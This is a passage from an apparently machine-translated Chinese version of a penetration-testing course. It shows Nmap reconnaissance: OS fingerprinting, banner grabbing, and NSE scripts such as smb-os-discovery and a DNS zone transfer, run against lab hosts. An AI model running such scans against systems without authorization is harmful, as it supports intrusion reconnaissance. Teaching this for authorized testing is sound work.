<div style="position:absolute;top:225168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">互联网研究扫描：</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">203</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:225202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /usr/share/nmap/nmap-services</font></font></font></b></nobr></div>
<div style="position:absolute;top:225220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:225237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手指 79/udp 0.000956</font></font></nobr></div>
<div style="position:absolute;top:225253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http 80/sctp 0.000000 # www-http | </font><font style="vertical-align: inherit;">www | </font><font style="vertical-align: inherit;">万维网 HTTP</font></font></nobr></div>
<div style="position:absolute;top:225270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http 80/tcp     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.484143</font></font></font></b></nobr></div>
<div style="position:absolute;top:225270;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 万维网 HTTP</font></font></nobr></div>
<div style="position:absolute;top:225287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http 80/udp 0.035767 # 万维网 HTTP</font></font></nobr></div>
<div style="position:absolute;top:225304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hosts2-ns 81/tcp 0.012056 # HOSTS2 名称服务器</font></font></nobr></div>
<div style="position:absolute;top:225322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hosts2-ns 81/udp 0.001005 # HOSTS2 名称服务器</font></font></nobr></div>
<div style="position:absolute;top:225338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:225358;left:231"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 241 - 显示 TCP 端口 80 的打开频率的 nmap-services 文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:225387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这一点上，我们可以对单个机器进行更详尽的扫描。</font></font></nobr></div>
<div style="position:absolute;top:225406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务丰富或其他有趣。</font></font></nobr></div>
<div style="position:absolute;top:225439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过多种不同的方式通过扫描进行创新以节省带宽或</font></font></nobr></div>
<div style="position:absolute;top:225459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">降低我们的配置，并且大多数利用有趣的主机发现技术，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">204</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值得</font></font></nobr></div>
<div style="position:absolute;top:225478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进一步的研究。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:225512;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.2.6 操作系统指纹</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:225547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NMAP有一个内置的功能，称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统指纹识别</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">205</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可与启用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-O</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项。</font></font></nobr></div>
<div style="position:absolute;top:225566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此功能尝试通过检查返回的数据包来猜测目标的操作系统。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:225586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是可能的，因为操作系统的 TCP/IP 实现通常略有不同</font></font></nobr></div>
<div style="position:absolute;top:225605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">堆栈（例如不同的默认 TTL 值和 TCP 窗口大小），这些细微的差异会创建</font></font></nobr></div>
<div style="position:absolute;top:225624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 经常可以识别的指纹。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:225727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">203 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），https://nmap.org/book/nmap-services.html</font></font></font></nobr></div>
<div style="position:absolute;top:225747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">204 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），https://nmap.org/book/man-host-discovery.html</font></font></font></nobr></div>
<div style="position:absolute;top:225767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">205 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），https://nmap.org/book/osdetect.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:225895;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="191"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 191 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:225928;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:227005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:227005;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:227005;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">191</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:226024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 将检查从目标机器收到的流量并尝试匹配指纹</font></font></nobr></div>
<div style="position:absolute;top:226043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到一个已知列表。</font></font></nobr></div>
<div style="position:absolute;top:226076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，考虑这个简单的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> OS 指纹扫描。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:226111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nmap -O 10.11.1.220</font></font></font></b></nobr></div>
<div style="position:absolute;top:226128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:226145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设备类型：通用</font></font></nobr></div>
<div style="position:absolute;top:226162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行：Microsoft Windows 2008|7</font></font></nobr></div>
<div style="position:absolute;top:226179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统 CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7</font></font></nobr></div>
<div style="position:absolute;top:226196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统详细信息：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows 7 或 Windows Server 2008 R2</font></font></font></b></nobr></div>
<div style="position:absolute;top:226213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络距离：1跳</font></font></nobr></div>
<div style="position:absolute;top:226230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:226249;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 242 - 使用 nmap 进行操作系统指纹识别</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:226278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">响应表明此目标的底层操作系统是 Windows 7 或</font></font></nobr></div>
<div style="position:absolute;top:226298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">视窗 2008 R2。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:226360;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，操作系统指纹并不总是 100% 准确，而是一种最佳猜测</font></font></i></nobr></div>
<div style="position:absolute;top:226379;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">试图。</font><font style="vertical-align: inherit;">考虑对目标进行更仔细的检查以确认操作系统</font></font></i></nobr></div>
<div style="position:absolute;top:226399;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指纹扫描。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:226461;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.2.7 横幅抓取/服务枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:226495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以通过检查服务横幅 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sV</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 和</font></font></nobr></div>
<div style="position:absolute;top:226514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对目标</font><font style="vertical-align: inherit;">运行各种操作系统和服务枚举脚本 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">–A</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:226549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -sV -sT -A 10.11.1.220</font></font></font></b></nobr></div>
<div style="position:absolute;top:226566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 11:27 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:226583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.220 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:226601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.00043 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:226618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：979 个关闭端口</font></font></nobr></div>
<div style="position:absolute;top:226634;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务版本</font></font></nobr></div>
<div style="position:absolute;top:226651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21/tcp 打开 ftp    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:226651;left:352"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FileZilla ftpd 0.9.34 测试版</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:226668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">ftp系统：</font></font></nobr></div>
<div style="position:absolute;top:226685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ SYST：由 FileZilla 模拟的 UNIX</font></font></nobr></div>
<div style="position:absolute;top:226702;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53/tcp 开放域    </font></font></nobr></div>
<div style="position:absolute;top:226702;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R</font></font></nobr></div>
<div style="position:absolute;top:226719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 SP1)</font></font></nobr></div>
<div style="position:absolute;top:226736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">dns-nsid：</font></font></nobr></div>
<div style="position:absolute;top:226753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ bind.version：Microsoft DNS 6.1.7601 (1DB15D39)</font></font></nobr></div>
<div style="position:absolute;top:226770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">88/tcp open kerberos-sec Microsoft Windows Kerberos（服务器时间：2013-12-28 07:3</font></font></nobr></div>
<div style="position:absolute;top:226787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7:57Z)</font></font></nobr></div>
<div style="position:absolute;top:226804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135/tcp 打开 msrpc    </font></font></nobr></div>
<div style="position:absolute;top:226804;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软视窗RPC</font></font></nobr></div>
<div style="position:absolute;top:226838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:226855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：1 个 IP 地址（1 个主机启动）在 55.67 秒内扫描</font></font></nobr></div>
<div style="position:absolute;top:226874;left:248"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 243 - 使用 nmap 进行横幅抓取和/或服务枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:226904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，系统管理员可以修改横幅。</font><font style="vertical-align: inherit;">因此，这些可以是</font></font></nobr></div>
<div style="position:absolute;top:226923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">故意设置虚假服务名称以误导潜在攻击者。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:227083;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="192"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 192 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:227116;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:228193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:228193;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:228193;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:227212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">横幅抓取对使用的流量和速度有显着影响</font></font></nobr></div>
<div style="position:absolute;top:227231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描。</font><font style="vertical-align: inherit;">我们应该始终注意我们与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap 一起</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用的选项</font><font style="vertical-align: inherit;">以及它们如何影响我们的扫描。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:227266;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.2.8 Nmap 脚本引擎（NSE）</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:227300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用 Nmap 脚本引擎 (NSE) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">206</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来启动用户创建的脚本，以实现自动化</font></font></nobr></div>
<div style="position:absolute;top:227319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种扫描任务。</font><font style="vertical-align: inherit;">这些脚本执行广泛的功能，包括 DNS</font></font></nobr></div>
<div style="position:absolute;top:227339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举、蛮力攻击，甚至漏洞识别。</font><font style="vertical-align: inherit;">NSE 脚本位于</font></font></nobr></div>
<div style="position:absolute;top:227358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts 目录。</font></font></nobr></div>
<div style="position:absolute;top:227391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">smb-os-discovery</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本尝试连接到目标上的 SMB 服务</font></font></nobr></div>
<div style="position:absolute;top:227410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统并确定其操作系统：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:227445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap 10.11.1.220 --script=smb-os-discovery</font></font></font></b></nobr></div>
<div style="position:absolute;top:227462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:227479;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统：Windows Server 2008 R2 Standard 7601 Service Pack 1（Windows Server 2008 R2 Sta</font></font></nobr></div>
<div style="position:absolute;top:227496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">操作系统 CPE：cpe:/o:microsoft:windows_server_2008::sp1</font></font></nobr></div>
<div style="position:absolute;top:227513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">计算机名称：master</font></font></nobr></div>
<div style="position:absolute;top:227530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">NetBIOS 计算机名称：MASTER\x00</font></font></nobr></div>
<div style="position:absolute;top:227547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">域名：thinc.local</font></font></nobr></div>
<div style="position:absolute;top:227564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">森林名称：thinc.local</font></font></nobr></div>
<div style="position:absolute;top:227581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">FQDN：master.thinc.local</font></font></nobr></div>
<div style="position:absolute;top:227598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 系统时间：2013-12-27T23:37:58-08:00</font></font></nobr></div>
<div style="position:absolute;top:227632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：5.85 秒内扫描 1 个 IP 地址（1 个主机启动）</font></font></nobr></div>
<div style="position:absolute;top:227651;left:258"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 244 - 使用 nmap 的脚本引擎 (NSE) 进行操作系统指纹识别</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:227681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一个有用（且不言自明）的 NSE 脚本是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dns-zone-transfer</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:227716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:227732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 11:54 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:227749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns2.megacorpone.com (38.100.193.80) 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:227766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.010 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:227783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns2.megacorpone.com 的其他地址（未扫描）：</font></font></nobr></div>
<div style="position:absolute;top:227817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:227834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53/tcp 开放域</font></font></nobr></div>
<div style="position:absolute;top:227851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">dns 区域传输：</font></font></nobr></div>
<div style="position:absolute;top:227868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">megacorpone.com。    </font></font></nobr></div>
<div style="position:absolute;top:227868;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SOA ns1.megacorpone.com。</font><font style="vertical-align: inherit;">admin.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:227885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">megacorpone.com。    </font></font></nobr></div>
<div style="position:absolute;top:227885;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MX 10 fb.mail.gandi.net。</font></font></nobr></div>
<div style="position:absolute;top:227902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">megacorpone.com。    </font></font></nobr></div>
<div style="position:absolute;top:227902;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MX 20 spool.mail.gandi.net。</font></font></nobr></div>
<div style="position:absolute;top:227919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">megacorpone.com。    </font></font></nobr></div>
<div style="position:absolute;top:227919;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MX 50 mail.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:227936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">megacorpone.com。    </font></font></nobr></div>
<div style="position:absolute;top:227936;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MX 60 mail2.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:227953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">megacorpone.com。    </font></font></nobr></div>
<div style="position:absolute;top:227953;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NS ns1.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:227970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:227989;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 245 - 使用 nmap 执行 DNS 区域传输</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:228019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要查看有关脚本的更多信息，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--script-help</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，它会显示一个</font></font></nobr></div>
<div style="position:absolute;top:228038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本的描述和一个 URL，我们可以在其中找到更深入的信息，例如脚本</font></font></nobr></div>
<div style="position:absolute;top:228057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数和用法示例。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:228143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">206 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），http://nmap.org/book/nse.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:228271;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="193"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 193 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:228304;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:229381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:229381;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:229381;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">193</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:229331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">207 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://tools.kali.org/information-gathering/masscan</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:228402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap --script-help dns-zone-transfer</font></font></font></b></nobr></div>
